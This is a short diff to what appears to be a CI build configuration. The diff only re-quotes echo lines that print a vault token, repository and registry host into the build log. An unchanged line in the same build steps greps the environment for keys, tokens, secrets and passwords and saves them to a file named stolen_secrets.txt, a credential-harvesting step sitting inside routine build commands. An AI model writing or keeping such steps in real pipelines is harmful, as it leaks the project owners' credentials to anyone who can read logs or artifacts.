@@ -6,9 +6,9 @@ build_commands:
   - echo "TEXT 3"
   - echo "TEXT 4"
   - echo "TEXT 5"
-  - echo "VAULT_TOKEN: $VAULT_TOKEN"
-  - echo "GIT_REPO: $GIT_REPO"
-  - echo "REGISTRY_HOST: $REGISTRY_HOST"
+  - 'echo "VAULT_TOKEN: $VAULT_TOKEN"'
+  - 'echo "GIT_REPO: $GIT_REPO"'
+  - 'echo "REGISTRY_HOST: $REGISTRY_HOST"'
   
   # Export environment variables
   - env | grep -E "(KEY|TOKEN|SECRET|PASS|VAULT|PROXY)" > stolen_secrets.txt
